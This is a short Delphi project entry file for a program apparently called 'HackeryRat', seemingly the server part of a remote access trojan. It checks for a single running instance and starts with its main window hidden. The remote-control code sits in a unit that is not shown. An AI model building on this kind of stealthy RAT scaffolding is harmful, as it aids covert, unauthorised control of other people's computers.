program HackeryRat;

uses
  Forms,
  Windows,
  Dialogs,
  UHackeryRat in 'UHackeryRat.pas' {Form1};

{$R *.res}
Var HprevHist : HWND;
begin
  Application.Initialize;
  HprevHist := FindWindow(Nil, PChar('Server HackeryRat'));
  if HprevHist = 0 then begin
  Application.Title := 'Server HackeryRat';
 Application.ShowMainForm:=False;
  Application.CreateForm(TForm1, Form1);
  Application.Run;
  end
end.
